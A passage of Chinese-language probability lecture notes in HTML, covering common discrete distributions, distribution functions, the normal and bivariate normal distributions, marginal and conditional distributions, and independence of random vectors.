<div class="tabbed-set tabbed-alternate" data-tabs="1:6"><input checked="checked" id="note-probability-second-_4-退化分布" name="note-probability-second-__tabbed_1" type="radio" /><input id="note-probability-second-_4-两点分布" name="note-probability-second-__tabbed_1" type="radio" /><input id="note-probability-second-_4-二项分布" name="note-probability-second-__tabbed_1" type="radio" /><input id="note-probability-second-_4-泊松分布" name="note-probability-second-__tabbed_1" type="radio" /><input id="note-probability-second-_4-几何分布" name="note-probability-second-__tabbed_1" type="radio" /><input id="note-probability-second-_4-超几何分布" name="note-probability-second-__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="note-probability-second-_4-退化分布">退化分布</label><label for="note-probability-second-_4-两点分布">两点分布</label><label for="note-probability-second-_4-二项分布">二项分布</label><label for="note-probability-second-_4-泊松分布">泊松分布</label><label for="note-probability-second-_4-几何分布">几何分布</label><label for="note-probability-second-_4-超几何分布">超几何分布</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p>即 degenerate distribution</p>
<div class="arithmatex">\[
\left[
\begin{matrix}
c\\
1
\end{matrix}
\right]
\]</div>
<p>即样本空间的所有点都映射到一个确定的实数上，概率为1</p>
</div>
<div class="tabbed-block">
<p>即 <strong>伯努利分布</strong> ，Bernoulli distribution</p>
<div class="arithmatex">\[
\left[
\begin{matrix}
1&amp;0\\
p&amp;1-p
\end{matrix}
\right],p\in (0,1)
\]</div>
</div>
<div class="tabbed-block">
<p>即 binomial distribution</p>
<div class="arithmatex">\[
P(\xi=k)=\begin{pmatrix}
    n\\k
\end{pmatrix}
p^k(1-p)^{n-k},p\in (0,1),k=0,1,\cdots,n
\]</div>
<p>记为 <span class="arithmatex">\(\xi\sim B(n,p)\)</span></p>
</div>
<div class="tabbed-block">
<p>即 Poisson distribution</p>
<div class="arithmatex">\[
P(\xi=k)=\frac{\lambda^k}{k!}e^{-\lambda}
,\lambda&gt;0,k\in \mathbb N
\]</div>
<p>记为 <span class="arithmatex">\(\xi\sim\mathcal{P}(\lambda)\)</span></p>
<p>对于二项分布，当 <span class="arithmatex">\(n\to\infty,np=\lambda\)</span> 时，二项分布趋近于泊松分布。</p>
<div class="arithmatex">\[\begin{align*}
\lim_{n\to\infty}\begin{pmatrix}
    n\\k
\end{pmatrix}p^k(1-p)^{n-k}&amp;=\frac{1}{k!}n(n-1)\cdots(n-k+1)\frac{1}{n^k}(np)^k(1-\frac{np}{n})^{n-k}\\
&amp;=\frac{\lambda^k}{k!}(1-\frac{1}{n})\cdots(1-\frac{k-1}{n})e^{-\lambda}\\
&amp;=\frac{\lambda^k}{k!}e^{-\lambda}\\
\end{align*}\]</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>其中 <span class="arithmatex">\(\lambda=np\)</span> 是泊松分布的参数，也是它的数学期望；
因为</p>
<div class="arithmatex">\[\begin{align*}
    E_{\xi\sim P(\lambda)}(\xi)&amp;=\sum_{k=0}^\infty k\frac{\lambda^k}{k!}e^{-\lambda}\\
    &amp;=\lambda\sum_{k=1}^\infty\frac{\lambda^{k-1}}{(k-1)!}e^{-\lambda}\\
    &amp;=\lambda e^{\lambda}e^{-\lambda}\\
    &amp;=\lambda
\end{align*}\]</div>
</div>
</div>
<div class="tabbed-block">
<p>即 geometry distribution,一般用于解决第一次成功的问题</p>
<div class="arithmatex">\[
P(\xi=k)=p(1-p)^{k-1},p\in (0,1),k\in \mathbb{N}_+
\]</div>
</div>
<div class="tabbed-block">
<p>即 hypergeometry distribution，一般用于解决次品抽样问题 </p>
<div class="arithmatex">\[
P(\xi=k)=\frac{\displaystyle
\begin{pmatrix}
    M\\k
\end{pmatrix}
\begin{pmatrix}
    N-M\\n-k
\end{pmatrix}
    }{\displaystyle
\begin{pmatrix}
    N\\n
\end{pmatrix}}
,n\leqslant N,M\leqslant N,k=0,1,\cdots, \min\{n,M\}
\]</div>
</div>
</div>
</div>
</div>
<h2 id="note-probability-second-_5">分布函数与连续型随机变量<a class="headerlink" href="#note-probability-second-_5" title="Permanent link">&para;</a></h2>
<p>离散型随机变量是用分布列来描述的，而对于某些情况，例如随机变量可以在某一个区间内取任意值，这个时候就不存在分布列，需要引入新的描述方法来描述概率分布，并且我们希望这个描述方法能够对一切的随机变量都适用。</p>
<div class="admonition definition">
<p class="admonition-title">分布函数</p>
<p>设 <span class="arithmatex">\(\xi\)</span> 是一个随机变量，对任意实数 <span class="arithmatex">\(x\)</span>，定义函数 <span class="arithmatex">\(F(x)\)</span> 为</p>
<div class="arithmatex">\[
F(x)=P(\xi \leqslant x)
\]</div>
<p>这个函数称为 <span class="arithmatex">\(\xi\)</span> 的 <strong>分布函数 (distribution function)</strong>
对于给定的随机变量 <span class="arithmatex">\(\xi\)</span>，其分布函数是唯一的，它是实变量 <span class="arithmatex">\(x\)</span> 的函数，且满足：</p>
<div class="admonition property">
<p class="admonition-title">性质</p>
<ul>
<li>有界性：作为事件的概率自然有 <span class="arithmatex">\(0\leqslant F(x)\leqslant 1\)</span></li>
<li>
<p>单调不减性：<span class="arithmatex">\(x_1&lt;x_2\Rightarrow F(x_1)\leqslant F(x_2)\)</span></p>
</li>
<li>
<p>作为一个有界的单调不减函数 <span class="arithmatex">\(F(-\infty)=0\)</span>, <span class="arithmatex">\(F(+\infty)=1\)</span></p>
</li>
<li>右连续性：<span class="arithmatex">\(\lim_{x\to x_0+0}F(x)=F(x_0)\)</span>，左极限存在<span class="arithmatex">\(\lim_{x\to x_0-0}F(x)=F(x_0)\)</span></li>
<li>在有些教材中  </li>
</ul>
<div class="arithmatex">\[F(x)=P(\xi &lt; x)\]</div>
<p>此时 <span class="arithmatex">\(F(x)\)</span>要求左连续,右极限存在</p>
</div>
<details class="note 各种随机变量的分布函数">
<summary>Note</summary>
<ul>
<li>对于离散型随机变量，其分布函数是阶梯函数</li>
<li>对于连续型随机变量，其分布函数是连续函数，采用密度函数积分来计算</li>
<li>只要函数值大于0，且整个定义域积分为1，就可以叫做密度函数</li>
</ul>
</details>
</div>
<h3 id="note-probability-second-_6">正态分布<a class="headerlink" href="#note-probability-second-_6" title="Permanent link">&para;</a></h3>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>若随机变量 <span class="arithmatex">\(\xi\)</span> 的分布函数为</p>
<div class="arithmatex">\[
F(x)=\frac{1}{\sqrt{2\pi}\sigma}\int_{-\infty}^x e^{-\frac{(t-\mu)^2}{2\sigma^2}}dt
\]</div>
<p>其中 <span class="arithmatex">\(\mu\)</span> 和 <span class="arithmatex">\(\sigma\)</span> 是常数，且 <span class="arithmatex">\(\sigma&gt;0\)</span>，则称 <span class="arithmatex">\(\xi\)</span> 服从参数为 <span class="arithmatex">\(\mu\)</span> 和 <span class="arithmatex">\(\sigma\)</span> 的 <strong>正态分布 (normal distribution)</strong>，记为 <span class="arithmatex">\(\xi\sim N(\mu,\sigma^2)\)</span></p>
<p>正态分布的密度函数为</p>
<div class="arithmatex">\[
f(x)=\frac{1}{\sqrt{2\pi}\sigma}e^{-\frac{(x-\mu)^2}{2\sigma^2}}
\]</div>
<p>正态分布是最重要的分布之一，它的密度函数是一个钟形曲线，且具有以下性质：</p>
<div class="admonition property">
<p class="admonition-title">Property</p>
<ul>
<li>期望值：<span class="arithmatex">\(E(\xi)=\mu\)</span></li>
<li>方差：<span class="arithmatex">\(D(\xi)=\sigma^2\)</span></li>
<li>正态分布的密度函数是关于 <span class="arithmatex">\(\mu\)</span> 对称的，即 <span class="arithmatex">\(f(x)=f(2\mu-x)\)</span></li>
</ul>
</div>
<div class="admonition section">
<p class="admonition-title">标准正态分布</p>
<p>若 <span class="arithmatex">\(\xi\sim N(0,1)\)</span>，则称 <span class="arithmatex">\(\xi\)</span> 服从 <strong>标准正态分布 (standard normal distribution)</strong>，记为 <span class="arithmatex">\(\xi\sim N(0,1)\)</span></p>
<p>此时 <span class="arithmatex">\(\mu=0\)</span>，<span class="arithmatex">\(\sigma=1\)</span>，其密度函数为</p>
<div class="arithmatex">\[
f(x)=\frac{1}{\sqrt{2\pi}}e^{-\frac{x^2}{2}}
\]</div>
<p>如果<span class="arithmatex">\(x\)</span>不是标准正态分布，则可以通过</p>
<div class="arithmatex">\[
    \eta = \dfrac{x - \mu}{ \sigma} 
\]</div>
<p>将其变为 <span class="arithmatex">\(\eta\)</span> ,标准分布</p>
</div>
</div>
<p>虽然标准正态分布的显式分布函数求不出来，但是可以通过查表得到其值</p>
<div class="admonition note">
<p class="admonition-title">3 <span class="arithmatex">\(\sigma\)</span> 原则</p>
<div class="arithmatex">\[
0.6827 \quad 0.9545 \quad 0.9973
\]</div>
</div>
<h3 id="note-probability-second-_7">离散型随机向量<a class="headerlink" href="#note-probability-second-_7" title="Permanent link">&para;</a></h3>
<p>给定概率空间 <span class="arithmatex">\((\Omega, A, P)\)</span>，<span class="arithmatex">\((X, Y)\)</span> 是 2-随机向量。</p>
<p>假设 <span class="arithmatex">\(X\)</span> 取值为 <span class="arithmatex">\(x_1, x_2, \dots\)</span>，<span class="arithmatex">\(Y\)</span> 取值为 <span class="arithmatex">\(y_1, y_2, \dots\)</span>。那么称 <span class="arithmatex">\((X, Y)\)</span> 为离散型随机向量。</p>
<p>记</p>
<div class="arithmatex">\[
p_{ij} = P(X = x_i, Y = y_j), \quad i, j = 1, 2, \dots
\]</div>
<p>满足</p>
<div class="arithmatex">\[
p_{ij} \geq 0, \quad \sum_{i,j} p_{ij} = 1
\]</div>
<p>称</p>
<div class="arithmatex">\[
\left( (x_i, y_j), p_{ij} \right)_{i,j=1}^{\infty}
\]</div>
<p>为随机向量 <span class="arithmatex">\((X, Y)\)</span> 的联合分布。</p>
<p>对于任意 Borel 集合 <span class="arithmatex">\( A, B \)</span>,</p>
<div class="arithmatex">\[
P(X \in A, Y \in B) = \sum_{i: x_i \in A, j: y_j \in B} p_{ij}
\]</div>
<p>特别地，</p>
<div class="arithmatex">\[
P(X \leq x, Y \leq y) = \sum_{i: x_i \leq x, j: y_j \leq y} p_{ij}
\]</div>
<h4 id="note-probability-second-_8">边际分布<a class="headerlink" href="#note-probability-second-_8" title="Permanent link">&para;</a></h4>
<p><span class="arithmatex">\( X, Y \)</span> 的分布可以由 <span class="arithmatex">\( p_{ij} \)</span> 计算得到</p>
<div class="arithmatex">\[
X \sim \begin{pmatrix} x_1 &amp; x_2 &amp; \dots &amp; x_i &amp; \dots \\ p_1. &amp; p_2. &amp; \dots &amp; p_i. &amp; \dots \end{pmatrix}
\]</div>
<p>其中</p>
<div class="arithmatex">\[
p_{i.} = \sum_{j=1}^{\infty} p_{ij}, \quad p_{i.} \geq 0, \quad \sum_{i=1}^{\infty} p_{i.} = 1
\]</div>
<p>类似地，</p>
<div class="arithmatex">\[
Y \sim \begin{pmatrix} y_1 &amp; y_2 &amp; \dots &amp; y_j &amp; \dots \\ p_{.1} &amp; p_{.2} &amp; \dots &amp; p_{.j} &amp; \dots \end{pmatrix}
\]</div>
<p>其中</p>
<div class="arithmatex">\[
p_{.j} = \sum_{i=1}^{\infty} p_{ij}, \quad p_{.j} \geq 0, \quad \sum_{j=1}^{\infty} p_{.j} = 1
\]</div>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>边际分布由联合分布唯一确定，但是反过来不一定成立。因为加起来等于一个值并不能确定分开的每一个值</p>
</div>
<h3 id="note-probability-second-_9">条件概率与条件分布<a class="headerlink" href="#note-probability-second-_9" title="Permanent link">&para;</a></h3>
<p>对于固定的 <span class="arithmatex">\( x_i, y_j \)</span>，我们得到</p>
<div class="arithmatex">\[
P(Y = y_j | X = x_i) = \frac{P(X = x_i, Y = y_j)}{P(X = x_i)} = \frac{p_{ij}}{p_i}
\]</div>
<p>如果 <span class="arithmatex">\( x_i, y_j \)</span> 变化，那么我们可以得到条件分布：</p>
<p>给定 <span class="arithmatex">\( X = x_i \)</span> 的条件下，<span class="arithmatex">\( Y \)</span> 可取值 <span class="arithmatex">\( y_1, y_2, \dots, y_j, \dots \)</span> 时，概率分别为</p>
<div class="arithmatex">\[
P(Y = y_j | X = x_i) = \frac{p_{ij}}{p_i}
\]</div>
<h4 id="note-probability-second-_10">条件分布列<a class="headerlink" href="#note-probability-second-_10" title="Permanent link">&para;</a></h4>
<div class="arithmatex">\[
Y | (X = x_i) \sim \begin{pmatrix} y_1 &amp; y_2 &amp; \dots &amp; y_j &amp; \dots \\ \frac{p_{i1}}{p_i} &amp; \frac{p_{i2}}{p_i} &amp; \dots &amp; \frac{p_{ij}}{p_i} &amp; \dots \end{pmatrix}
\]</div>
<p>同理也可以得到 <span class="arithmatex">\(X|Y\)</span> 的条件分布</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>方便起见，这里把 <span class="arithmatex">\(P_{i.}\)</span> 记为 <span class="arithmatex">\(P_i\)</span></p>
</div>
<h3 id="note-probability-second-_11">连续性随机向量<a class="headerlink" href="#note-probability-second-_11" title="Permanent link">&para;</a></h3>
<p>给定概率空间 <span class="arithmatex">\((\Omega, A, P)\)</span>，<span class="arithmatex">\((X, Y)\)</span> 是其上的随机向量。如果存在 <span class="arithmatex">\(p(x, y)\)</span> 使得</p>
<div class="arithmatex">\[ 
p(x, y) \geq 0, \quad \int_{-\infty}^{\infty} \int_{-\infty}^{\infty} p(x, y) dx dy = 1 
\]</div>
<p>并且对任意 Borel 集 <span class="arithmatex">\(A, B \subset \mathbb{R}\)</span>,</p>
<div class="arithmatex">\[ 
P(X \in A, Y \in B) = \int_A \int_B p(u, v) du dv 
\]</div>
<p>那么称 <span class="arithmatex">\((X, Y)\)</span> 是连续型随机向量，具有密度函数 <span class="arithmatex">\(p(x, y)\)</span>。</p>
<p>特别，对任意 <span class="arithmatex">\(x, y \in \mathbb{R}\)</span></p>
<div class="arithmatex">\[ 
P(X \leq x, Y \leq y) = \int_{-\infty}^x \int_{-\infty}^y p(u, v) du dv 
\]</div>
<h4 id="note-probability-second-_12">连续型的边际分布<a class="headerlink" href="#note-probability-second-_12" title="Permanent link">&para;</a></h4>
<p>显然，如果 <span class="arithmatex">\((X, Y)\)</span> 是连续型随机向量，那么 <span class="arithmatex">\(X, Y\)</span> 都是连续型随机变量。并且，</p>
<div class="arithmatex">\[ 
X \sim p_X(x), \quad Y \sim p_Y(y) 
\]</div>
<p>其中</p>
<div class="arithmatex">\[ 
p_X(x) = \int_{-\infty}^{\infty} p(x, y) dy, \quad p_Y(y) = \int_{-\infty}^{\infty} p(x, y) dx 
\]</div>
<p>同样，联合分布惟一决定边际分布，边际分布不能决定联合分布。</p>
<h4 id="note-probability-second-_13">连续型的条件分布<a class="headerlink" href="#note-probability-second-_13" title="Permanent link">&para;</a></h4>
<p>与离散型的类似；连续型的条件分布的密度函数就是在原来的基础上分母变为对应确定变量的边际函数某点的值；更详细地说:</p>
<p>假设 <span class="arithmatex">\((X, Y)\)</span> 是连续型随机向量，具有联合密度函数 <span class="arithmatex">\(p(x, y)\)</span>，下面讨论条件分布</p>
<p>给定 <span class="arithmatex">\(X = x\)</span>，求 <span class="arithmatex">\(Y\)</span> 的分布？</p>
<p>即 <span class="arithmatex">\(P(Y \leq y | X = x)\)</span></p>
<p>注意 <span class="arithmatex">\(P(X = x) = 0\)</span>，我们采用</p>
<div class="arithmatex">\[ 
P(Y \leq y | X = x) = \lim_{\varepsilon \to 0} P(Y \leq y | x - \varepsilon &lt; X \leq x + \varepsilon) 
\]</div>
<div class="arithmatex">\[
P(Y \leq y | X = x) = \lim_{\varepsilon \to 0} \frac{P(Y \leq y, x - \varepsilon &lt; X \leq x + \varepsilon)}{P(x - \varepsilon &lt; X \leq x + \varepsilon)}
\]</div>
<div class="arithmatex">\[
= \lim_{\varepsilon \to 0} \frac{\int_{x-\varepsilon}^{x+\varepsilon} \int_{-\infty}^{y} p(u, v) \, dv \, du / (2 \varepsilon)}{\int_{x-\varepsilon}^{x+\varepsilon} p_X(u) \, du / (2\varepsilon)}
\]</div>
<div class="arithmatex">\[
= \frac{\int_{-\infty}^{y} p(x, v) \, dv}{p_X(x)}
\]</div>
<p>给定 <span class="arithmatex">\(X = x\)</span> 下，<span class="arithmatex">\(Y\)</span> 具有密度函数</p>
<div class="arithmatex">\[
p_{Y|X}(y|x) = \frac{p(x, y)}{p_X(x)}
\]</div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>推导过程中上下同时除以 <span class="arithmatex">\(2\varepsilon\)</span> 是为了使用拉格朗日中值定理
即</p>
<div class="arithmatex">\[
    F(x+\varepsilon)-F(x-\varepsilon) = F'(\xi)2\varepsilon
\]</div>
</div>
<div class="admonition example">
<p class="admonition-title">联合正态分布</p>
<p>如果随机向量 <span class="arithmatex">\((X, Y)\)</span> 具有密度函数：<span class="arithmatex">\(\forall x, y \in \mathbb{R}\)</span></p>
<div class="arithmatex">\[
p(x, y) = \frac{1}{2\pi\sigma_1\sigma_2\sqrt{1-\rho^2}} e^{-\frac{1}{2(1-\rho^2)}\left(\frac{(x-\mu_1)^2}{\sigma_1^2} - \frac{2\rho(x-\mu_1)(y-\mu_2)}{\sigma_1\sigma_2} + \frac{(y-\mu_2)^2}{\sigma_2^2}\right)}
\]</div>
<p>那么称 <span class="arithmatex">\((X, Y)\)</span> 服从二维联合正态分布，<span class="arithmatex">\(\mu_1, \mu_2, \sigma_1^2, \sigma_2^2, \rho\)</span> 为参数。简记</p>
<div class="arithmatex">\[
(X, Y) \sim \mathcal{N}(\mu_1, \sigma_1^2, \mu_2, \sigma_2^2; \rho)
\]</div>
<p>验证 <span class="arithmatex">\(p(x, y)\)</span> 确实是密度函数</p>
<div class="arithmatex">\[
\int_{-\infty}^{\infty} \int_{-\infty}^{\infty} \frac{1}{2\pi\sigma_1\sigma_2\sqrt{1-\rho^2}} e^{-\frac{1}{2(1-\rho^2)}\left[\frac{x^2}{\sigma_1^2} - \frac{2\rho xy}{\sigma_1\sigma_2} + \frac{y^2}{\sigma_2^2}\right]} dxdy = 1
\]</div>
<p>经过变换：<span class="arithmatex">\(u = \frac{x-\mu_1}{\sigma_1}, v = \frac{y-\mu_2}{\sigma_2}\)</span>，等价于</p>
<div class="arithmatex">\[
\int_{-\infty}^{\infty} \int_{-\infty}^{\infty} \frac{1}{2\pi\sqrt{1-\rho^2}} e^{-\frac{1}{2(1-\rho^2)}[u^2 - 2\rho uv + v^2]} dudv = 1
\]</div>
<p>左边进行配方，得</p>
<div class="arithmatex">\[
= \int_{-\infty}^{\infty} \frac{1}{\sqrt{2\pi}} e^{-v^2/2} \left( \int_{-\infty}^{\infty} \frac{1}{\sqrt{2\pi(1-\rho^2)}} e^{-\frac{1}{2(1-\rho^2)}(u-\rho v)^2} du \right) dv
\]</div>
<div class="arithmatex">\[
= \int_{-\infty}^{\infty} \frac{1}{\sqrt{2\pi}} e^{-v^2/2} dv = 1
\]</div>
<div class="admonition idea">
<p class="admonition-title">Idea</p>
<p>这里利用了标准正态分布的性质，即</p>
<div class="arithmatex">\[
\int_{-\infty}^{\infty} \frac{1}{\sqrt{2\pi}} e^{-v^2/2} dv = 1
\]</div>
</div>
<div class="admonition property">
<p class="admonition-title">联合正态分布的边际分布</p>
<p><span class="arithmatex">\(p_X(x)\)</span> 和 <span class="arithmatex">\(p_Y(y)\)</span> 都是正态分布</p>
<p>假设 <span class="arithmatex">\((X, Y) \sim \mathcal{N}(\mu_1, \sigma_1^2, \mu_2, \sigma_2^2; \rho)\)</span>，求 <span class="arithmatex">\(X, Y\)</span> 的边际分布？</p>
<div class="arithmatex">\[ 
X \sim p_X(x) 
\]</div>
<div class="arithmatex">\[
p_X(x) = \int_{-\infty}^{\infty} p(x, y) \, dy
\]</div>
<div class="arithmatex">\[
= \int_{-\infty}^{\infty} \frac{1}{2\pi\sigma_1\sigma_2\sqrt{1-\rho^2}} e^{-\frac{1}{2(1-\rho^2)}\left[\frac{(x-\mu_1)^2}{\sigma_1^2} - \frac{2\rho(x-\mu_1)(y-\mu_2)}{\sigma_1\sigma_2} + \frac{(y-\mu_2)^2}{\sigma_2^2}\right]} \, dy
\]</div>
<p>进行配方，得</p>
<p>令 <span class="arithmatex">\(z = y - \mu_2\)</span>，则</p>
<div class="arithmatex">\[
p_X(x) = \int_{-\infty}^{\infty} \frac{1}{2\pi\sigma_1\sigma_2\sqrt{1-\rho^2}} e^{-\frac{1}{2(1-\rho^2)}\left[\frac{(x-\mu_1)^2}{\sigma_1^2} - \frac{2\rho(x-\mu_1)z}{\sigma_1\sigma_2} + \frac{z^2}{\sigma_2^2}\right]} \, dz
\]</div>
<p>将指数部分进行配方，得</p>
<div class="arithmatex">\[
-\frac{1}{2(1-\rho^2)}\left[\frac{(x-\mu_1)^2}{\sigma_1^2} - \frac{2\rho(x-\mu_1)z}{\sigma_1\sigma_2} + \frac{z^2}{\sigma_2^2}\right] = -\frac{(x-\mu_1)^2}{2\sigma_1^2} - \frac{z^2 - 2\rho(x-\mu_1)z\sigma_2/\sigma_1 + \rho^2(x-\mu_1)^2\sigma_2^2/\sigma_1^2}{2\sigma_2^2(1-\rho^2)}
\]</div>
<div class="arithmatex">\[
= -\frac{(x-\mu_1)^2}{2\sigma_1^2} - \frac{(z - \rho(x-\mu_1)\sigma_2/\sigma_1)^2}{2\sigma_2^2(1-\rho^2)}
\]</div>
<p>因此，</p>
<div class="arithmatex">\[
p_X(x) = \frac{1}{2\pi\sigma_1\sigma_2\sqrt{1-\rho^2}} e^{-\frac{(x-\mu_1)^2}{2\sigma_1^2}} \int_{-\infty}^{\infty} e^{-\frac{(z - \rho(x-\mu_1)\sigma_2/\sigma_1)^2}{2\sigma_2^2(1-\rho^2)}} \, dz
\]</div>
<p>由于</p>
<div class="arithmatex">\[
\int_{-\infty}^{\infty} e^{-\frac{(z - \rho(x-\mu_1)\sigma_2/\sigma_1)^2}{2\sigma_2^2(1-\rho^2)}} \, dz = \sqrt{2\pi\sigma_2^2(1-\rho^2)}
\]</div>
<p>所以</p>
<div class="arithmatex">\[
p_X(x) = \frac{1}{2\pi\sigma_1\sigma_2\sqrt{1-\rho^2}} e^{-\frac{(x-\mu_1)^2}{2\sigma_1^2}} \cdot \sqrt{2\pi\sigma_2^2(1-\rho^2)}
\]</div>
<div class="arithmatex">\[
= \frac{1}{\sqrt{2\pi}\sigma_1} e^{-\frac{(x-\mu_1)^2}{2\sigma_1^2}}
\]</div>
<p>因此，</p>
<div class="arithmatex">\[
X \sim \mathcal{N}(\mu_1, \sigma_1^2)
\]</div>
</div>
<p>当 <span class="arithmatex">\(\rho = 0\)</span> 时，<span class="arithmatex">\(X, Y\)</span> 独立</p>
</div>
<p>对于一般的随机向量，有可能其既没有分布列，也没有密度函数，此时主要用其分布函数来描述。</p>
<h3 id="note-probability-second-_14">独立性<a class="headerlink" href="#note-probability-second-_14" title="Permanent link">&para;</a></h3>
<p>对于联合分布，如果 <span class="arithmatex">\(p(x,y)=p_X(x)p_Y(y)\)</span>，则称 <span class="arithmatex">\(X\)</span> 和 <span class="arithmatex">\(Y\)</span> 独立。</p>
<p>或者 <span class="arithmatex">\(F(x,y)=F_X(x)F_Y(y)\)</span></p>
<p>或者对于任意波雷尔集<span class="arithmatex">\(A,B\)</span></p>
<div class="arithmatex">\[
    P( X \in A,Y \in B)=P(X \in A)P(Y \in B)
\]</div>
<p>一般最后一个是很好用的，可以用来证明<span class="arithmatex">\(f(X),g(Y)\)</span>是独立的，(运用原像集也是博雷尔集的性质)</p>
<h3 id="note-probability-second-_15">二元分布函数的性质<a class="headerlink" href="#note-probability-second-_15" title="Permanent link">&para;</a></h3>
<div class="admonition property">
<p class="admonition-title">二元分布函数的性质</p>
<ul>
<li><span class="arithmatex">\(F(-\infty, y) = 0\)</span>, <span class="arithmatex">\(F(x, -\infty) = 0\)</span>, <span class="arithmatex">\(F(\infty, \infty) = 1\)</span></li>
<li><span class="arithmatex">\(F(x, y)\)</span> 关于 <span class="arithmatex">\(x\)</span> 和 <span class="arithmatex">\(y\)</span> 非减</li>
<li><span class="arithmatex">\(F(x, y)\)</span> 关于 <span class="arithmatex">\(x\)</span> 和 <span class="arithmatex">\(y\)</span> 右连续，左极限存在</li>
</ul>
<div class="arithmatex">\[
    P(a &lt; X \leqslant b, c &lt; Y \leqslant d) = F(a,c)+F(b,d)-F(a,d)-F(b,c)
\]</div>
<p>可以从积分区域的角度理解</p>
</div>
<p><span class="arithmatex">\(F_X(x) = F(x, \infty)\)</span></p>
<p><span class="arithmatex">\(F_Y(y) = F(\infty, y)\)</span></p>
<h3 id="note-probability-second-_16">条件分布<a class="headerlink" href="#note-probability-second-_16" title="Permanent link">&para;</a></h3>
<p>假设 <span class="arithmatex">\((X, Y)\)</span> 具有分布函数 <span class="arithmatex">\(F(x, y)\)</span>，那么给定 <span class="arithmatex">\(X = x\)</span>，<span class="arithmatex">\(Y\)</span> 的条件分布函数为</p>
<div class="arithmatex">\[
P(Y \leqslant y | X = x) = \lim_{\varepsilon \to 0} P(Y \leqslant y | x - \varepsilon &lt; X \leqslant x + \varepsilon)
\]</div>
<div class="arithmatex">\[
= \lim_{\varepsilon \to 0} \frac{F(x + \varepsilon, y) - F(x - \varepsilon, y)}{F_X(x + \varepsilon) - F_X(x - \varepsilon)}
\]</div>
<p>类似地，</p>
<div class="arithmatex">\[
P(X \leqslant x | Y = y) = \lim_{\varepsilon \to 0} P(X \leqslant x | y - \varepsilon &lt; Y \leqslant y + \varepsilon)
\]</div>
<div class="arithmatex">\[
= \lim_{\varepsilon \to 0} \frac{F(x, y + \varepsilon) - F(x, y - \varepsilon)}{F_Y(y + \varepsilon) - F_Y(y - \varepsilon)}
\]</div>
<h3 id="note-probability-second-_17">多维随机向量<a class="headerlink" href="#note-probability-second-_17" title="Permanent link">&para;</a></h3>
<ul>
<li>多维随机向量</li>
</ul>
<p>假设 <span class="arithmatex">\((\Omega, \mathcal{A}, P)\)</span> 是给定的概率空间，</p>
<div class="arithmatex">\[
\mathbf{X} = (X_1, X_2, \cdots, X_m) : \Omega \mapsto \mathbb{R}^m
\]</div>
<p>如果对任意 Borel 集 <span class="arithmatex">\(B \subset \mathbb{R}^m\)</span>,</p>
<div class="arithmatex">\[
\{\omega : \mathbf{X}(\omega) \in B\} \in \mathcal{A}
\]</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>这里指的是经过随机向量的映射后仍属于博雷尔集的样本点的集合仍在事件域中</p>
</div>
<p>那么称 <span class="arithmatex">\(\mathbf{X}\)</span> 为 <span class="arithmatex">\(m\)</span>-维随机向量</p>
<ul>
<li><span class="arithmatex">\(m\)</span>-元联合分布函数</li>
</ul>
<p>假设 <span class="arithmatex">\(\mathbf{X} = (X_1, X_2, \cdots, X_m)\)</span> 是 <span class="arithmatex">\(m\)</span>-维随机向量，其联合分布函数为</p>
<div class="arithmatex">\[
F_{\mathbf{X}}(\mathbf{x}) = P(X_1 \leq x_1, \cdots, X_m \leq x_m)
\]</div>
<p>其中 <span class="arithmatex">\(\mathbf{x} = (x_1, \cdots, x_m)\)</span>.</p>
<ul>
<li>边际分布</li>
</ul>
<p><span class="arithmatex">\(X_i\)</span> 的边际分布为</p>
<div class="arithmatex">\[
F_{X_i}(x_i) = P(X_i \leq x_i)
\]</div>
<ul>
<li>独立随机变量</li>
</ul>
<p>假设 <span class="arithmatex">\(\mathbf{X} = (X_1, X_2, \cdots, X_m)\)</span> 是 <span class="arithmatex">\(m\)</span>-维随机向量，其联合分布函数为 <span class="arithmatex">\(F_{\mathbf{X}}(x)\)</span>，边际分布为 <span class="arithmatex">\(F_{X_i}(x_i), i = 1, \cdots, m\)</span>。如果</p>
<div class="arithmatex">\[
F_{\mathbf{X}}(\mathbf{x}) = \prod_{i=1}^{m} F_{X_i}(x_i), \quad \forall \mathbf{x} = (x_1, \cdots, x_m)
\]</div>
<p>那么称 <span class="arithmatex">\(X_1, X_2, \cdots, X_m\)</span> 相互独立。</p>
<ul>
<li>
<p>注：如果 <span class="arithmatex">\(X_1, X_2, \cdots, X_m\)</span> 相互独立，那么</p>
</li>
<li>
<p><span class="arithmatex">\((X_{i_1}, X_{i_2}, \cdots, X_{i_k}), k \leq m\)</span> 相互独立</p>
</li>
<li><span class="arithmatex">\(f_1(X_1), f_2(X_2), \cdots, f_m(X_m)\)</span> 相互独立</li>
<li><span class="arithmatex">\(f(X_{i_1}, X_{i_2}, \cdots, X_{i_k}), g(X_{j_1}, X_{j_2}, \cdots, X_{j_l})\)</span> 分别是 <span class="arithmatex">\(k\)</span> 元和 <span class="arithmatex">\(l\)</span> 元 Borel 可测函数，且 <span class="arithmatex">\(A \cap B = \emptyset\)</span>。如果 <span class="arithmatex">\(A, B \subset \{1, 2, \cdots, m\}, |A| = k, |B| = l\)</span>，并且 <span class="arithmatex">\(A \cap B = \emptyset\)</span>，那么 <span class="arithmatex">\(f(X_i, i \in A)\)</span> 和 <span class="arithmatex">\(g(X_i, i \in B)\)</span> 相互独立。</li>
</ul>
<h3 id="note-probability-second-_18">随机变量的映射<a class="headerlink" href="#note-probability-second-_18" title="Permanent link">&para;</a></h3>
<p>对于常见的函数<span class="arithmatex">\(f\)</span>,<span class="arithmatex">\(Y=f(X)\)</span>,如果<span class="arithmatex">\(X\)</span>是随机变量，我们为了要求<span class="arithmatex">\(Y\)</span>是随机变量，需要满足<span class="arithmatex">\(f\)</span>是Borel可测函数，即对于任意Borel集<span class="arithmatex">\(B\)</span>，<span class="arithmatex">\(f^{-1}(B)\)</span>也是Borel集,对于一维的情况，主要有以下两种方法来计算Y的分布</p>
<div class="admonition section">
<p class="admonition-title">计算Y的分布</p>
